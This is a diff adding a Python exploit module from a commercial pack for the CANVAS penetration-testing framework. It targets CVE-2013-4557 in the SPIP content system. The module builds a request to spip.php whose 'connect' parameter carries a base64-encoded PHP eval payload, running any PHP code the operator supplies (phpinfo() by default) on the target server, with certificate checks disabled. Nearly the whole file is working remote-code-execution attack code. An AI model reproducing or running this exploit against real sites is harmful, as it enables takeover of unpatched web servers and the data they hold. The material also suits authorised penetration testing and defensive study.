@@ -1,0 +1,95 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2013
+#
+
+import sys, time, os, re
+
+sys.path.append(".")
+sys.path.append("../../")
+
+import canvasengine
+
+from exploitutils import *
+from ExploitTypes.phpexploit import *
+import StringIO
+import urllib
+
+NAME = "d2sec_spip_rce_2.py"
+VERSION = "0.1"
+DESCRIPTION = "SPIP ecran_securite connect Parameter RCE"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Web Exploits"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Linux"], ["Windows"], ["Solaris"], ["AIX"], ["FreeBSD"], ["MacOSX"], ["HP-UX"] ]
+
+DOCUMENTATION = {}
+DOCUMENTATION["Versions Affected"] = "<= 2.1.23, <= 3.0.11"
+DOCUMENTATION["Date public"] = "2013/11/09"
+DOCUMENTATION["References"] = "http://osvdb.org/show/osvdb/99684"
+DOCUMENTATION["CVE Url"] = "CVE-2013-4557"
+
+class theexploit (tcpexploit):
+    
+  def __init__(self):
+    tcpexploit.__init__(self)
+    self.host = ''
+    self.port = 80 
+    self.uri = 'spip'
+    self.https = 0
+    self.command = 'phpinfo();'
+    self.name = NAME
+	
+  def getargs(self):	
+    self.host = self.target.interface
+    self.port = int(self.argsDict.get("port",self.port))
+    self.uri = self.argsDict.get("uri",self.uri)
+    self.command = self.argsDict.get("command",self.command)
+    self.https = int(self.argsDict.get("https",self.https))
+
+  def run(self):
+    self.getargs()
+    self.setInfo('[D2] %s attacking %s:%d' % (NAME,self.host,self.port))
+    self.command = b64encode(self.command)[:-3]
+    content = StringIO.StringIO()
+    try:
+      import pycurl
+    except Exception, e:
+      self.log('[D2] %s' % e)
+      self.log('[D2] Install module python-pycurl')
+      return 0 
+    try:
+      proto = 'http'
+      c = pycurl.Curl()
+      if self.https:
+        proto = 'https'
+      c.setopt(pycurl.URL, '%s://%s/%s/spip.php?connect=1??>><?php%%20eval(base64_decode(%s));%%20??>>' % (proto, self.host, self.uri, self.command))
+      c.setopt(c.USERAGENT, 'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.1)')
+      c.setopt(c.TIMEOUT, 15)
+      if self.https:
+        c.setopt(c.SSL_VERIFYPEER, 0)
+        c.setopt(c.SSL_VERIFYHOST, 0)
+      c.perform()
+      c.close()
+    except Exception, e:
+      self.log('[D2] %s' % e)
+      return 0
+    data = content.getvalue()
+    content.close()
+    self.log(data)
+    self.setInfo('[D2] %s attacking %s:%d - done' % (NAME,self.host,self.port))
+    return 1
+
+  def usage(self):
+    print "Usage: "+sys.argv[0]+" -t target [-p port:80] -O https:[0|1] -O uri:<path> -O command:<command>" 
+    sys.exit(0)
+    
+if __name__ == '__main__':
+  print "Running CANVAS %s v %s" % (NAME,VERSION)
+  app = theexploit()
+  ret = standard_callback_commandline(app)
